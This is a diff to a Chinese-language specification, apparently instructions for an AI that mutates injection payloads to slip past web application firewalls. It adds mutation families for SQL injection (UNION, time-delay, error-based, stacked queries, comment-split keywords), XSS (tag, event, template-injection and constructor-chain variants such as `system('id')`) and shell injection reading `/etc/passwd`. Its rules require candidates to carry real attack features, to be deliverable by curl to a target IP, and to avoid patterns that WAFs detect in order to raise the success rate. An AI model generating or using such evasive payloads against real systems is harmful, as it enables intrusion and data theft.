@@ -75,15 +75,37 @@
 
 ## XSS 部件类型详解
 
+XSS 攻击分为**传统 HTML 标签型**和**非标签型**（模板注入、JS 上下文等）两大类。解析器会根据 payload 结构自动识别类型。
+
+### 传统 HTML 标签型 XSS 部件
+
 | part_type | 语义角色 | required | 允许操作 |
 |-----------|----------|----------|----------|
 | `context_prefix` | XSS 触发前上下文 | true | replace |
-| `tag` | HTML 标签 | true | replace |
+| `tag` | HTML 标签（`<script>`, `<img>` 等） | true | replace |
 | `attribute_boundary` | 属性边界/间距 | true | replace |
-| `event_handler` | 事件处理器 | true | replace |
+| `event_handler` | 事件处理器（`onerror`, `onload` 等） | true | replace |
 | `javascript_expression` | JS 执行表达式 | true | replace |
-| `closing_structure` | 标签闭合结构 | true | replace |
+| `closing_structure` | 标签闭合结构（`>`, `/>`, `</tag>`） | true | replace |
 | `text_spacing` | 文本间距/空白 | false | replace, add, remove |
+
+### 非标签型 XSS 部件
+
+适用于模板注入、JS 上下文注入等非 HTML 标签场景：
+
+| part_type | 语义角色 | required | 示例 | 允许操作 |
+|-----------|----------|----------|------|----------|
+| `context_prefix` | 模板/上下文起始标记 | true | `<%=`, `{{`, `${`, `"` | replace |
+| `javascript_expression` | 核心执行表达式 | true | `alert(1)`, `constructor.constructor(...)` | replace |
+| `closing_structure` | 闭合标记 | true | `%>`, `}}`, `}`, `-'` | replace |
+| `event_handler` | 事件处理器（属性注入） | true | `onload=` | replace |
+
+**非标签型 XSS 类型识别**：
+- **模板注入（ERB/JSP）**：`context_prefix` 为 `<%=` 或 `<%`
+- **模板引擎（Angular/Vue）**：`context_prefix` 为 `{{`
+- **JS 模板字面量**：`context_prefix` 为 `${`
+- **属性注入**：`context_prefix` 为引号（`"` 或 `'`）且有 `event_handler`
+- **纯 JS 上下文**：`context_prefix` 为引号，包含函数调用但无事件处理器
 
 ---
 
@@ -175,20 +197,68 @@
 - `part:subshell-add` — 子 Shell 包装（`cat /etc/passwd` → `$(cat /etc/passwd)` → `` `cat /etc/passwd` ``）
 - `part:here-string-add` — Here-string 重定向（`cat /etc/passwd` → `cat <<< /etc/passwd`）
 
-### SQL 注入方向族
-- `part:predicate-rewrite` — 谓词重写（`1=1` → `1 BETWEEN 0 AND 2` → `1 IN (1)` → `NOT(1<>1)`）
-- `part:operator-switch` — 运算符切换（`OR` → `||`，`AND` → `&&`）
-- `part:comment-change` — 注释符替换（`--` → `#` → `;%00` → `/**/`）
-- `part:ws-change` — 空白替换（空格 → `\t` → `\n` → `/**/` → 括号）
-- `part:subquery-add` — 子查询包装（`SELECT ... WHERE id=` → `SELECT ... WHERE id=(SELECT ...)`)
-- `part:value-rewrite` — 比较值重写（`'admin'` → `CHAR(97,100,109,105,110)` → `0x61646D696E`）
+### SQL 注入方向族（按攻击类别使用）
+
+**通用（所有 SQL 注入类别可用）**
+- `part:predicate-rewrite` — 谓词重写（`1=1` → `1 BETWEEN 0 AND 2` → `1 IN (1)` → `NOT(1<>1)` → `EXISTS(SELECT 1)`）
+- `part:predicate-bitwise` — 位运算谓词（`1&1=1`, `1|0=1`, `1^0=1`）
+- `part:predicate-regex` — LIKE/REGEXP/RLIKE 谓词
+- `part:predicate-cmp-func` — STRCMP/LOCATE/INSTR/FIND_IN_SET 函数谓词
+- `part:operator-switch` — 运算符切换（`OR`→`||`→`|`，`AND`→`&&`→`&`，`NOT`→`!`，`XOR`→`^`）
+- `part:comment-change` — 注释符替换（`--` → `-- -` → `/**/` → `;%00`）**⚠ URL 路径下禁用 `#`**
+- `part:comment-inline` — 内联注释插入关键字内部（`SEL/**/ECT`, `UN/*!*/ION`）
+- `part:ws-change` — 空白替换（空格 → `/**/` → `+` → `%09` → 括号）
+- `part:paren-restructure` — 括号重构消除空白依赖（`OR 1=1` → `OR(1)=(1)`）
+- `part:subquery-add` — 子查询包装（`1=1` → `1=(SELECT 1)`, `'admin'` → `(SELECT 'admin')`）
+- `part:value-hex` — 十六进制字面量（`'admin'` → `0x61646D696E`）
+- `part:value-char` — CHAR/CONCAT/UNHEX 构造字符串
+- `part:value-scientific` — 科学计数/浮点/位串（`1` → `1e0` → `1.0` → `b'1'`）
+- `part:value-cast` — CAST/CONVERT 包装
+- `part:fn-info-swap` — 信息函数同义（`database()`↔`schema()`，`user()`↔`current_user()`）
+- `part:fn-version-wrap` — 版本条件注释包裹（`/*!50000SELECT*/`）
+- `part:case-mix` — 关键字大小写混合（必须叠加另一维度）
+- `part:keyword-comment` — 关键字内插注释（`UNION` → `UN/**/ION`）
+- `part:clause-restructure` — 子句结构重组（追加 `FROM DUAL`，条件重序）
+- `part:sql-combine` — 组合 2+ 种 SQL 技术
+
+**按攻击类别专用（`base_parts` 的 `predicate.semantic_role` 中会标注 `attack_class=xxx`）**
+- **Union 类（attack_class=union）**：`part:union-rewrite`（`UNION SELECT` → `UNION ALL SELECT` / `UNION(SELECT ...)`），`part:union-columns`（列值改为 `NULL`/HEX/子查询）
+- **Time 类（attack_class=time）**：`part:fn-time-swap`（`SLEEP(N)` → `BENCHMARK` / `GET_LOCK` / `IF(1=1,SLEEP(N),0)`）
+- **Error 类（attack_class=error）**：`part:fn-error-swap`（`UpdateXML` ↔ `ExtractValue` ↔ `GTID_SUBSET` ↔ `EXP(~(SELECT...))`）
+- **Stacked 类（attack_class=stacked）**：`part:stacked-swap`（第二条堆叠语句等价替换）
+
+**必须遵守的攻击类别保持原则**：不要把 Time 类改成 Boolean 类，不要把 Union 类改成 Error 类——保持原始 `attack_class`。
 
 ### XSS 方向族
+
+**传统 HTML 标签型 XSS 方向**
 - `part:tag-switch` — 标签替换（`<script>` → `<img>` → `<svg>` → `<body>` → `<details>`）
 - `part:event-switch` — 事件替换（`onerror` → `onload` → `ontoggle` → `onfocus`）
 - `part:expression-rewrite` — JS 表达式重写（`alert(1)` → `prompt(1)` → `confirm(1)` → `eval('alert(1)')`）
 - `part:closure-change` — 闭合变换（`>` → `/>` → ` autofocus>`）
 - `part:spacing-change` — 间距变换（空格 → `\t` → `\n` → `\r` → `\f`）
+
+**非标签型 XSS 方向**
+- `part:template-expr-rewrite` — 模板表达式重写（适用于 `<%=`, `{{`, `${` 类型）
+  - 模板注入（ERB/JSP）：`system('id')` → `` `id` `` → `exec('id')` → `IO.popen('id').read`
+  - 模板引擎（Angular/Vue）：`constructor.constructor(...)` → `_c.constructor(...)` → `[].constructor.constructor(...)`
+  - JS 模板字面量：`alert(1)` → `eval('alert(1)')` → `Function('alert(1)')()`
+- `part:context-prefix-change` — 上下文标记变换（仅限同类型内）
+  - 模板注入：`<%=` ↔ `<%`（输出型 ↔ 非输出型）
+  - 引号类型：`"` ↔ `'`（双引号 ↔ 单引号）
+- `part:function-swap` — 函数替换（`alert` → `prompt` → `confirm` → `eval`）
+- `part:constructor-chain-rewrite` — 构造器链重写（`constructor.constructor` → `__proto__.constructor` → `[].constructor`）
+- `part:operator-wrap` — 运算符包装（`-alert(1)-` → `+alert(1)+` → `*alert(1)*`）
+- `part:indirect-call` — 间接调用（`alert(1)` → `(alert)(1)` → `window['alert'](1)` → `self.alert(1)`）
+- `part:event-attr-injection` — 事件属性注入变换（属性注入类专用，`onload` → `onerror` → `onfocus`）
+
+**XSS 攻击类别保持原则**：
+- 模板注入类（`<%`）→ 只改表达式，保留模板标记
+- 模板引擎类（`{{`）→ 只改构造器链/表达式，保留双花括号
+- JS 模板字面量类（`${`）→ 只改 JS 表达式，保留 `${}`
+- 属性注入类 → 保留引号边界，可改事件类型
+- 纯 JS 上下文类 → 保留函数调用语义，可改函数或运算符
+- **禁止跨类型转换**：不要把 `{{...}}` 改成 `<script>`，不要把 `${...}` 改成 `<img>`
 
 ---
 
@@ -206,6 +276,17 @@
 10. 生成的 payload 不能以换行符（`\n` 或 `%0a`）开头——这会导致 URL 编码失败。
 11. 禁止生成仅包含验证标记的 payload（如 `EXEC_OK` 单独出现）——这是无害的测试标记，不是实际攻击向量。验证标记应保留在完整 payload 的末尾。
 12. 禁止使用 IFS 变量替换（`${IFS}`, `$IFS`, `${IFS%??}` 等）——现代 WAF 专门检测这些模式，使用会降低成功率。改用制表符、花括号展开或其他技术。
+
+### SQL 注入专用硬性约束（补充）
+
+13. **恶意内容要求**：SQL 注入候选**必须**包含真实攻击特征（SQL 关键字、运算符、函数、注释或堆叠语句中的至少一个）——纯 `admin`、`1`、`'` 等无害字符串会被后端立即拒绝。
+14. **URL 路径投递安全**：投递上下文为 `curl "http://<ip>/<payload>"` + `Host: <vhost>`。因此：
+    - **禁止**以 MySQL 单行注释 `#` 结尾——`#` 是 URL 片段起始符，服务端根本收不到后面的内容。请用 `-- -` / `/**/` / `;%00`。
+    - **禁止**在 payload 中出现裸的 `?`——它会开启 query string 分割 payload。
+    - 尽量避免裸的 `/`——除非在 `/*...*/` 中。
+15. **保持攻击类别**：`predicate.semantic_role` 中标注了 `attack_class`（boolean/union/error/time/stacked）——变异必须保留同一类别。Time 类变异后必须仍能产生延时，Union 类必须仍含 `UNION SELECT`，Error 类必须仍触发报错函数。
+16. **跨任务去重意识**：`direction_context.existing_candidate_contents` 提供了历史已生成候选样本；**你生成的每个候选必须与该列表中的任何一条都不同**（超越大小写/空白差异的实质性不同）。后端会做数据库级去重，重复候选会被丢弃。
+17. **本轮候选间差异性**：同一批 candidate_count 个候选必须在 SQL 关键字/函数/结构层面**互不相同**——不允许两个候选只是标点或空白差异。
 
 ---
 
